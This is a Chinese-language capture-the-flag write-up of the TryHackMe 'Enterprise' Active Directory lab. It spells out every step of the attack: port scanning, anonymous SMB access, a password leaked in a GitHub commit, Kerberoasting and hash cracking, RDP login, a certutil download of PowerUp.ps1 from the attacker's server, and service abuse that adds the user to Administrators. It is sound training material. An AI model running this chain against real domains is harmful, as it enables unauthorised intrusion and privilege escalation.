---
title: "THM Enterprise"
description: "TryHackMe篇之Enterprise"

date: 2024-10-23T15:42:46+08:00
lastmod: 2025-11-11T14:05:02+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Windows
---
<!--more-->

> 靶机ip：10.10.76.81

# 信息收集

## nmap扫描

```bash
nmap --min-rate 10000 -A -sV -sC -p- 10.10.184.113
```

```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 15:44 CST
Warning: 10.10.184.113 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.184.113
Host is up (0.36s latency).
Not shown: 59956 closed tcp ports (reset), 5552 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-23 07:44:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-23T07:46:13+00:00
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2024-10-22T07:43:23
|_Not valid after:  2025-04-23T07:43:23
|_ssl-date: 2024-10-23T07:46:26+00:00; -1s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/23%OT=53%CT=1%CU=31414%PV=Y%DS=2%DC=T%G=Y%TM=671
OS:8A9DA%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=RD%II=I%SS=
OS:S%TS=U)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=102%GCD=
OS:1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%I
OS:I=I%SS=S%TS=U)OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O
OS:5=M509NW8NNS%O6=M509NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=F
OS:F70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
OS:1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF
OS:I=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-10-23T07:46:15
|_  start_date: N/A

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   359.39 ms 10.14.0.1
2   360.71 ms 10.10.184.113

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.50 seconds
```

不难看出这是一台域控机器，开放了若干端口，域名为`LAB.ENTERPRISE.THM`，将其添加到`/etc/hosts`文件中

![image-20241023164242012](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023164304313-1442381621.png)

## SMB

先简单探测下smb服务

```bash
smbclient -L //10.10.184.113
```

![image-20241023155122981](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023155144317-1847528457.png)

发现一些共享目录，尝试匿名登陆访问

```bash
smbclient //10.10.184.113/Docs
```

![image-20241023155511089](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023155531326-846039650.png)

发现两个文件`get`下来

```bash
smbclient //10.10.184.113/Users
```

![image-20241023155603137](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023155623661-1766656713.png)

把`desktop.ini`下载下来，同时在`Users`目录中，找到一些用户名

将用户名保存下来

![image-20241023155901976](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023155922742-1623262837.png)

在`Default`目录中找到些文件，查看一下之前下载的文件

![image-20241023160434574](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023160456960-1428865174.png)

![image-20241023160516110](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023160539318-945036663.png)

发现这两个文件需要密码才能查看

![image-20241023160602672](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023160627583-292902303.png)

## 80端口

![image-20241023160110776](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023160131115-1178226363.png)

默认页面没什么信息，扫描一下后台

![image-20241023160710469](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023160734235-742745560.png)

![image-20241023160753616](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023160820658-791344310.png)

没啥用

## 7990端口

![image-20241023162156550](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023162220892-1397336076.png)

这是一个`Atlassian`并且发现内容是`Enterprise-THM`，正在迁移至github，我们上去google搜索一下

![image-20241023162718049](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023162740885-2011563018.png)

![image-20241023162813746](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023162838024-1090127372.png)

注意到有个用户`Nik-enterprise-dev`，里面有一个库`mgmtScript.ps1`，库里面还有个ps1文件`mgmtScript.ps1`

![image-20241023163010726](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023163037619-1307610051.png)

查看一下历史记录

![image-20241023163105667](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023163133624-1566744799.png)

发现了他的用户名及密码`nik:ToastyBoi!`

## rpc

有了一组用户凭据，尝试探测一下`rpc`，枚举一下用户

 ```bash
rpcclient lab.enterprise.thm -U nik --password="ToastyBoi!"
 ```

![image-20241023190823732](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023190844546-934835508.png)

找到很多域用户，将其保存到`users`文件中，方便后续利用

# rdp登录bitbucket

有了一组凭据和用户名列表就可以尝试`AS-REP Roasting`，检查一下域中用户是否有用户禁用了预身份验证，如果有的话，我们就可以请求`TGT`密钥，就可以尝试离线破解密钥

```bash
GetNPUsers.py lab.enterprise.thm/ -usersfile users -dc-ip 10.10.184.113
```

![image-20241023194812832](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023194833249-196889267.png)

接下来查看是否有用户设置了`SPN`，如果有的话，我们可以请求`TGS`密钥

```bash
GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!
```

![image-20241023185741834](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023185802387-322860292.png)

发现`bitbucket`用户设置了`SPN`，我们请求`TGS`并尝试破解

````bash
GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request
````

![image-20241023185859159](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023185920000-1248219664.png)

将上述票据保存为`hash`，使用`john`爆破`hash`值

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`john hash -show`

![image-20241023195147299](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023195207909-243147148.png)

爆破出密码`littleredbucket`

rdp尝试登陆

```bash
xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm
```

![image-20241023202950998](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023203011100-308824680.png)

在桌面找到`user.txt`

# 提权至root

使用`PowerUp.ps1`来分析可能提升权限的漏洞，将文件传到靶机上

攻击机启动python服务

![image-20241023210705120](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241023210727187-1693192503.png)

从受害者机器上，我们使用`certutil`从 `Powershell` 获取可执行文件：

```powershell
certutil.exe -urlcache -f http://10.14.90.122:8000/PowerUp.ps1 PowerUp.ps1
```

![image-20241024155939035](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241024160000887-1751636811.png)

运行`PowerUp.ps1`后执行`Invoke-AllChecks`

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

![image-20241024161233438](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241024161255216-268400229.png)

我们发现`zerotieroneservice`是作为`SYSTEM`运行的，并且可以重启该服务

使用下面的命令滥用此功能，将当前用户`bitbucket`添加到管理员组

```powershell
Install-ServiceBinary -Name "zerotieroneservice" -Command "net localgroup Administrators lab.enterprise.thm\bitbucket /add"
```

![image-20241024161951199](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241024162013069-1833540896.png)

执行后，我们重启`zerotieroneservice`服务

```powershell
sc.exe stop zerotieroneservice
sc.exe start zerotieroneservice
```

查看一下当前用户

```powershell
net user bitbucket
```

![image-20241024162251879](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241024162313666-1753984328.png)

发现我们当前属于`Administrator`组

使用`evil-winrm`登录（使用evil-winrm的原因纯粹是因为我rdp登录卡的要死）

```bash
evil-winrm -i 10.10.76.81 -u bitbucket -p littleredbucket
```

![image-20241024162834485](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241024162856683-1105115210.png)

找到`root.txt`